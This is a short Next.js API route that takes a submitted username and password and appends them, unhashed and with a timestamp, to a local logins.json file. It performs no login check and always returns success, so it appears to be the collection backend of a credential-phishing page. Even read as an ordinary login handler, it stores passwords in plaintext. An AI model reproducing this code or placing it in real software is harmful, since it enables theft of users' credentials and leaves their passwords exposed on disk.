import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

export async function POST(request) {
  try {
    const { username, password } = await request.json();

    const logEntry = {
      username,
      password,
      date: new Date().toISOString(),
    };

    const filePath = path.join(process.cwd(), "logins.json");

    let logins = [];
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf-8");
      logins = JSON.parse(fileContent);
    }

    logins.push(logEntry);
    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2), "utf-8");

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
